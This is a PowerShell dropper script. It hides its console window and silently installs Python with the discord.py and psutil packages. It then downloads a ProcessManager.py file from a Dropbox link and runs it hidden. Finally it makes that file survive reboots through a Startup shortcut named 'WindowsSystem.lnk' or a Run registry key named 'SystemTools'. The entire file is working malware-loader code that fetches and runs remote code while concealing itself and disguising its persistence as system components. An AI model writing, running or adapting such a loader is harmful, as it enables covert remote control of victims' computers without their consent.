# Python Script Runner with Startup Persistence - Windows 10/11 Compatible
# Save as .ps1 file and run

# Simple window hiding that works on all Windows versions
try {
    $signature = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@
    $type = Add-Type -MemberDefinition $signature -Name "Win32" -Namespace Win32Functions -PassThru
    $consolePtr = $type::GetConsoleWindow()
    $type::ShowWindow($consolePtr, 0)  # 0 = hide window
} catch {
    # Continue silently if hiding fails
}

# Function to check if Python is installed
function Test-Python {
    try {
        # Try to actually run Python and get version
        $result = cmd /c "python --version 2>&1"
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Python found: $result" -ForegroundColor Green
            return $true
        }
    } catch {
        # Continue to next check
    }
    
    try {
        # Try python3
        $result = cmd /c "python3 --version 2>&1"
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Python found: $result" -ForegroundColor Green
            return $true
        }
    } catch {
        # Continue to next check
    }
    
    return $false
}

# Function to install Python silently - UPDATED TO USE FULL INSTALLER
function Install-Python {
    Write-Host "Installing Python..." -ForegroundColor Yellow
    
    # Use full Python installer (not embedded) for better compatibility
    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
    $installerPath = "$env:TEMP\python_installer.exe"
    $installPath = "$env:LOCALAPPDATA\Programs\Python\Python310"
    
    try {
        # Download Python installer
        Write-Host "Downloading Python installer..." -ForegroundColor Yellow
        Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -UseBasicParsing
        
        # Install Python for current user only (no admin required)
        Write-Host "Installing Python silently..." -ForegroundColor Yellow
        $process = Start-Process -FilePath $installerPath -ArgumentList @(
            "/quiet",
            "InstallAllUsers=0",
            "PrependPath=1",
            "Include_test=0",
            "Include_pip=1",
            "Include_launcher=0",
            "SimpleInstall=1"
        ) -Wait -PassThru -WindowStyle Hidden
        
        if ($process.ExitCode -eq 0) {
            Write-Host "Python installed successfully" -ForegroundColor Green
            
            # Wait a bit for installation to complete
            Start-Sleep -Seconds 5
            
            # Refresh environment to recognize Python in PATH
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
            
            return $installPath
        } else {
            Write-Host "Python installer failed with exit code: $($process.ExitCode)" -ForegroundColor Red
            return $null
        }
    } catch {
        Write-Host "Failed to install Python: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# Function to install dependencies - SIMPLIFIED AND MORE RELIABLE
function Install-Dependencies {
    Write-Host "Installing Python packages..." -ForegroundColor Yellow
    
    # Try multiple methods to install packages
    $packages = @("discord.py", "psutil")
    
    foreach ($pkg in $packages) {
        Write-Host "Installing $pkg..." -ForegroundColor Yellow
        
        # Method 1: Using pip directly
        try {
            $process = Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", $pkg, "--quiet", "--user" -Wait -PassThru -WindowStyle Hidden
            if ($process.ExitCode -eq 0) {
                Write-Host "✓ $pkg installed successfully" -ForegroundColor Green
                continue
            }
        } catch {
            # Continue to next method
        }
        
        # Method 2: Using pip with --no-cache-dir
        try {
            $process = Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", $pkg, "--quiet", "--user", "--no-cache-dir" -Wait -PassThru -WindowStyle Hidden
            if ($process.ExitCode -eq 0) {
                Write-Host "✓ $pkg installed successfully" -ForegroundColor Green
                continue
            }
        } catch {
            # Continue to next method
        }
        
        # Method 3: Using easy_install as fallback
        try {
            $process = Start-Process -FilePath "python" -ArgumentList "-m", "easy_install", $pkg -Wait -PassThru -WindowStyle Hidden
            if ($process.ExitCode -eq 0) {
                Write-Host "✓ $pkg installed via easy_install" -ForegroundColor Green
                continue
            }
        } catch {
            # Package installation failed
        }
        
        Write-Host "⚠ Could not install $pkg, but continuing..." -ForegroundColor Yellow
    }
}

# Function to add to startup (works on Win 10/11)
function Add-Startup {
    param($ScriptPath)
    
    Write-Host "Setting up startup persistence..." -ForegroundColor Yellow
    
    # Method 1: Startup folder (most reliable, no admin needed)
    try {
        $startupPath = [Environment]::GetFolderPath("Startup")
        $shortcutPath = "$startupPath\WindowsSystem.lnk"
        
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut($shortcutPath)
        $Shortcut.TargetPath = "python"
        $Shortcut.Arguments = "`"$ScriptPath`""
        $Shortcut.WindowStyle = 7  # Minimized
        $Shortcut.WorkingDirectory = "$env:USERPROFILE"
        $Shortcut.Save()
        Write-Host "✓ Startup shortcut created successfully" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Startup folder method failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Method 2: Registry (fallback)
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "SystemTools"
        $regValue = "python `"$ScriptPath`""
        
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
        Write-Host "✓ Registry startup entry added" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Registry method failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return $false
}

# Main execution - SIMPLIFIED AND MORE RELIABLE
try {
    # Check if Python is available
    if (Test-Python) {
        Write-Host "✓ Python is available" -ForegroundColor Green
    } else {
        Write-Host "Python not found, installing..." -ForegroundColor Yellow
        $pythonPath = Install-Python
        
        if (-not $pythonPath) {
            Write-Host "❌ Python installation failed!" -ForegroundColor Red
            exit 1
        }
        
        # Verify Python works after installation
        if (-not (Test-Python)) {
            Write-Host "❌ Python not found after installation!" -ForegroundColor Red
            exit 1
        }
        
        Write-Host "✓ Python installed successfully" -ForegroundColor Green
    }
    
    # Install dependencies
    Install-Dependencies
    
    # Download the main script
    Write-Host "Downloading main script..." -ForegroundColor Yellow
    
    $scriptUrl = "https://www.dropbox.com/scl/fi/5tz22k0sppp1jh9x9drhv/ProcessManager.py?rlkey=a1xn2hxrh7u6b52rr4id4yp6d&st=vzuethzw&dl=1"
    $scriptPath = "$env:USERPROFILE\ProcessManager.py"
    
    # Download the script
    try {
        Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing
        Write-Host "✓ Script downloaded to: $scriptPath" -ForegroundColor Green
    } catch {
        Write-Host "❌ Failed to download script: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
    
    if (Test-Path $scriptPath) {
        Write-Host "Running script..." -ForegroundColor Green
        
        # Run the script hidden
        Start-Process -FilePath "python" -ArgumentList "`"$scriptPath`"" -WindowStyle Hidden
        Write-Host "✓ Script started successfully!" -ForegroundColor Green
        
        # Add to startup
        if (Add-Startup -ScriptPath $scriptPath) {
            Write-Host "✓ Startup persistence configured!" -ForegroundColor Green
        } else {
            Write-Host "⚠ Failed to configure startup, but script is running" -ForegroundColor Yellow
        }
    } else {
        Write-Host "❌ Script file not found after download" -ForegroundColor Red
    }
    
} catch {
    Write-Host "❌ Unexpected error: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "Setup completed!" -ForegroundColor Green
Start-Sleep -Seconds 3
